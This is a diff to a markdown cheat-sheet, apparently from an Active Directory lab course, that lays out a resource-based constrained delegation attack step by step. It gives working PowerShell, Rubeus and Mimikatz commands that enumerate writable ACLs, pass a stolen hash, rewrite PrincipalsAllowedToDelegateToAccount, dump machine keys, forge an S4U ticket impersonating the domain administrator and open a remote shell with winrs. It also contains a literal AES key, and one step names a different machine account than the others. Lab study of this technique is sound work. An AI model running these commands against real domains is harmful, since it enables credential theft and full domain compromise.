@@ -1,6 +1,33 @@
-Local admin privileges are required.
+**Local admin privileges to the foothold/attacker machine are required due to the need of a machine hash**
 
-Find users that have `Write` permissions over a machine
+Find that a compromised user has `Write` permissions over a machine (PowerView)
 ```powershell
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+```
 
+Shell as user with `Write` permissions - `ciadmin` - OPtH
+```powershell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:ciadmin /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+As `ciadmin`, add your foothold machine that you have local admin privileges to  the`PrincipalsAllowedToDelegateToAccount` (PowerView + AD Module)
+```powershell
+Set-DomainRBCD -Identity dcorpmgmt
+
+$comps = 'dcorp-student548$'
+Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+```
+
+Obtain foothold/attacker machine machine hash (`dcorp-student548$`)
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+Obtain ticket as machine account (`dcorp-student548$`) to access "second hop machine" (`dcorp-mgmt`)  as **ANY** user in the domain.
+```powershell
+Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+```
+
+```powershell
+winrs -r:dcorp-mgmt cmd.exe
 ```
